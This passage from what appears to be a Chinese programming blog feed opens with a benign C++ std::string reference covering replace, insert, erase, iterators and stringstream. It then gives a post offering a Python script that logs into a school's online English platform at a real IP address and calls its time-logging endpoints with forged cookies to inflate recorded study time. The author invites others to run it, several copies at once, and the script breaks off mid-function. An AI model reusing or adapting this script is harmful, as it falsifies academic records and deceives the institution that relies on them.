<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//删除从p0开始的n0个字符，然后在p0处插入串s
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n0</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//删除p0开始的n0个字符，然后在p0处插入字符串s的前n个字符
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n0</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">);</span>

<span class="c1">//删除从p0开始的n0个字符，然后在p0处插入串s
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n0</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//删除p0开始的n0个字符，然后在p0处插入串s中从pos开始的n个字符
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n0</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">);</span>

<span class="c1">//删除p0开始的n0个字符，然后在p0处插入n个字符c
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n0</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">);</span>

<span class="c1">//把[first0，last0）之间的部分替换为字符串s
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="n">iterator</span> <span class="n">first0</span><span class="p">,</span> <span class="n">iterator</span> <span class="n">last0</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//把[first0，last0）之间的部分替换为s的前n个字符
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="n">iterator</span> <span class="n">first0</span><span class="p">,</span> <span class="n">iterator</span> <span class="n">last0</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">);</span>

<span class="c1">//把[first0，last0）之间的部分替换为串s
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="n">iterator</span> <span class="n">first0</span><span class="p">,</span> <span class="n">iterator</span> <span class="n">last0</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>

<span class="c1">//把[first0，last0）之间的部分替换为n个字符c
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="n">iterator</span> <span class="n">first0</span><span class="p">,</span> <span class="n">iterator</span> <span class="n">last0</span><span class="p">,</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">);</span>

<span class="c1">//把[first0，last0）之间的部分替换成[first，last）之间的字符串string类的插入函：
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">replace</span><span class="p">(</span><span class="n">iterator</span> <span class="n">first0</span><span class="p">,</span> <span class="n">iterator</span> <span class="n">last0</span><span class="p">,</span><span class="n">const_iterator</span> <span class="n">first</span><span class="p">,</span><span class="n">const_iteratorlast</span><span class="p">);</span>

<span class="n">string</span> <span class="o">&amp;</span><span class="n">insert</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">);</span>

<span class="n">string</span> <span class="o">&amp;</span><span class="n">insert</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">);</span>

<span class="n">string</span> <span class="o">&amp;</span><span class="n">insert</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>

<span class="n">string</span> <span class="o">&amp;</span><span class="n">insert</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span><span class="k">const</span> <span class="n">string</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">);</span>
<span class="c1">//前4个函数在p0位置插入字符串s中pos开始的前n个字符
</span><span class="c1"></span>
<span class="c1">//此函数在p0处插入n个字符c
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">insert</span><span class="p">(</span><span class="kt">int</span> <span class="n">p0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">);</span>

<span class="c1">//在it处插入字符c，返回插入后迭代器的位置
</span><span class="c1"></span><span class="n">iterator</span> <span class="nf">insert</span><span class="p">(</span><span class="n">iterator</span> <span class="n">it</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">);</span>

<span class="c1">//在it处插入[first，last）之间的字符
</span><span class="c1"></span><span class="kt">void</span> <span class="nf">insert</span><span class="p">(</span><span class="n">iterator</span> <span class="n">it</span><span class="p">,</span> <span class="n">const_iterator</span> <span class="n">first</span><span class="p">,</span> <span class="n">const_iterator</span> <span class="n">last</span><span class="p">);</span>

<span class="c1">//在it处插入n个字符c
</span><span class="c1"></span><span class="kt">void</span> <span class="nf">insert</span><span class="p">(</span><span class="n">iterator</span> <span class="n">it</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="string类的删除函数">string类的删除函数</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">//删除[first，last）之间的所有字符，返回删除后迭代器的位置
</span><span class="c1"></span><span class="n">iterator</span> <span class="nf">erase</span><span class="p">(</span><span class="n">iterator</span> <span class="n">first</span><span class="p">,</span> <span class="n">iterator</span> <span class="n">last</span><span class="p">);</span>

<span class="c1">//删除it指向的字符，返回删除后迭代器的位置
</span><span class="c1"></span><span class="n">iterator</span> <span class="nf">erase</span><span class="p">(</span><span class="n">iterator</span> <span class="n">it</span><span class="p">);</span>

<span class="c1">//删除pos开始的n个字符，返回修改后的字符串
</span><span class="c1"></span><span class="n">string</span> <span class="o">&amp;</span><span class="n">erase</span><span class="p">(</span><span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">npos</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="string类的迭代器处理">string类的迭代器处理：</h2>
<p>string类提供了向前和向后遍历的迭代器iterator，迭代器提供了访问各个字符的语法，类似于指针操作，迭代器不检查范围。</p>
<p>用string::iterator或string::const_iterator声明迭代器变量，const_iterator不允许改变迭代的内容。</p>
<h3 id="常用迭代器函数有">常用迭代器函数有：</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">const_iterator</span> <span class="nf">begin</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>

<span class="n">iterator</span> <span class="nf">begin</span><span class="p">();</span> <span class="c1">//返回string的起始位置
</span><span class="c1"></span>
<span class="n">const_iterator</span> <span class="nf">end</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>

<span class="n">iterator</span> <span class="nf">end</span><span class="p">();</span><span class="c1">//返回string的最后一个字符后面的位置
</span><span class="c1"></span>
<span class="n">const_iterator</span> <span class="nf">rbegin</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>

<span class="n">iterator</span> <span class="nf">rbegin</span><span class="p">();</span> <span class="c1">//返回string的最后一个字符的位置
</span><span class="c1"></span>
<span class="n">const_iterator</span> <span class="nf">rend</span><span class="p">()</span><span class="k">const</span><span class="p">;</span>

<span class="n">iterator</span> <span class="nf">rend</span><span class="p">();</span><span class="c1">//返回string第一个字符位置的前面rbegin
</span><span class="c1"></span>
<span class="err">和</span><span class="n">rend用于从后向前的迭代访问</span><span class="err">，通过设置迭代器</span>

<span class="n">string</span><span class="o">::</span><span class="n">reverse_iterator</span><span class="p">,</span><span class="n">string</span><span class="o">::</span><span class="n">const_reverse_iterator实现</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="字符串流处理">字符串流处理：</h2>
<p>通过定义ostringstream和istringstream变量实现，<sstream>头文件中</p>
<h3 id="例如">例如：</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"> <span class="n">string</span> <span class="nf">input</span><span class="p">(</span><span class="s">&#34;hello,this is a test&#34;</span><span class="p">);</span>

 <span class="n">istringstream</span> <span class="nf">is</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>

 <span class="n">string</span> <span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">,</span><span class="n">s3</span><span class="p">,</span><span class="n">s4</span><span class="p">;</span>

 <span class="n">is</span><span class="o">&gt;&gt;</span><span class="n">s1</span><span class="o">&gt;&gt;</span><span class="n">s2</span><span class="o">&gt;&gt;</span><span class="n">s3</span><span class="o">&gt;&gt;</span><span class="n">s4</span><span class="p">;</span><span class="c1">//s1=&#34;hello,this&#34;,s2=&#34;is&#34;,s3=&#34;a&#34;,s4=&#34;test&#34;
</span><span class="c1"></span>
 <span class="n">ostringstream</span> <span class="n">os</span><span class="p">;</span>

 <span class="n">os</span><span class="o">&lt;&lt;</span><span class="n">s1</span><span class="o">&lt;&lt;</span><span class="n">s2</span><span class="o">&lt;&lt;</span><span class="n">s3</span><span class="o">&lt;&lt;</span><span class="n">s4</span><span class="p">;</span>

 <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">os</span><span class="p">.</span><span class="n">str</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>新理念外语网络教学平台脚本刷时长</title><link>https://lgf.im/posts/coding/new-concept-foreign-language-online-teaching-platform-script/</link><pubDate>Sun, 14 Oct 2018 18:15:22 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/new-concept-foreign-language-online-teaching-platform-script/</guid><description><![CDATA[<p>这是我们学校用的平台，自己写了一个脚本，可以用来刷时间，可以多开同时刷。</p>
<p>20分钟刷一册书不是问题。</p>
<p>有需要的拿去，随便改改就能用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">root</span> <span class="o">=</span> <span class="s2">&#34;http://202.194.7.18/NPlearning&#34;</span>
<span class="n">timeurl</span> <span class="o">=</span> <span class="n">root</span><span class="o">+</span><span class="s2">&#34;/Student/LogTime.aspx&#34;</span>
<span class="n">studyurl</span> <span class="o">=</span> <span class="n">root</span><span class="o">+</span><span class="s2">&#34;/student/CourseStudy.aspx&#34;</span>
<span class="n">ctoken</span> <span class="o">=</span> <span class="bp">None</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">ua</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0&#34;</span><span class="p">}</span>
<span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">ua</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">randomnocache</span><span class="p">():</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">())</span>

<span class="c1">#登陆账号</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=</span><span class="si">%2F</span><span class="s2">wEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6&amp;tbName=&#34;</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s2">&#34;&amp;tbPwd=&#34;</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="s2">&#34;&amp;btnLogin=</span><span class="si">%E</span><span class="s2">7</span><span class="si">%99%</span><span class="s2">BB+</span><span class="si">%E</span><span class="s2">5%BD%95&#34;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/login.aspx&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">root</span><span class="o">+</span><span class="s2">&#34;/login.aspx&#34;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;登陆成功&#34;</span><span class="p">)</span>

    <span class="n">ctoken</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;InitToken(&#39;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">11</span><span class="p">:</span><span class="n">t</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;InitToken(&#39;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">49</span><span class="p">]</span>
    <span class="c1"># 添加了cookies</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">RequestsCookieJar</span><span class="p">()</span>  <span class="c1"># 定义一个cookie对象</span>
    <span class="n">c</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;TimeRecordEnabled&#39;</span><span class="p">,</span> <span class="s1">&#39;true&#39;</span><span class="p">)</span>  <span class="c1"># 增加cookie的值</span>
    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>  <span class="c1"># 更新s的cookie</span>
    <span class="n">c</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;ctoken&#39;</span><span class="p">,</span> <span class="n">ctoken</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="c1">#访问http://202.194.7.18/NPlearning/studentdefault.aspx，不知道作用是什么，没有返回任何东西，但是添加了cookies，估计是向服务器记录什么</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">root</span><span class="o">+</span><span class="s2">&#34;/studentdefault.aspx&#34;</span><span class="p">)</span>

<span class="c1"># 1.学习课程</span>
<span class="k">def</span> <span class="nf">couseStudy</span><span class="p">(</span><span class="n">book</span><span class="p">,</span><span class="n">unit</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;t=studyunit&amp;c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&amp;u=Unit_0&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">unit</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/student/CourseIndex.aspx?c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">studyurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="c1"># 2.检查授权</span>
<span class="k">def</span> <span class="nf">checkauthorize</span><span class="p">():</span>
    <span class="n">data</span><span class="o">=</span><span class="s2">&#34;logType=checkneedauthorize&amp;material=College_English_NEW_SecEdition_Integrated_3&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit&amp;c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&amp;u=Unit_02&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">(),</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">ok</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>


<span class="c1"># 3.不知道用来干啥用的方法</span>
<span class="k">def</span> <span class="nf">getcomment</span><span class="p">(</span><span class="n">book</span><span class="p">,</span><span class="n">unit</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;logType=getcomment&amp;classno=2017-0002-0033&amp;material=College_English_NEW_SecEdition_Integrated_3&amp;unit=Unit_0&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">unit</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit&amp;c=2017-0002-0033&amp;m=College_English_NEW_SecEdition_Integrated_3&amp;u=Unit_0&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">unit</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">(),</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>


<span class="c1">#获取服务器时间</span>
<span class="k">def</span> <span class="nf">getServerTime</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;logType=getservertime&amp;nocache=&#34;</span> <span class="o">+</span> <span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
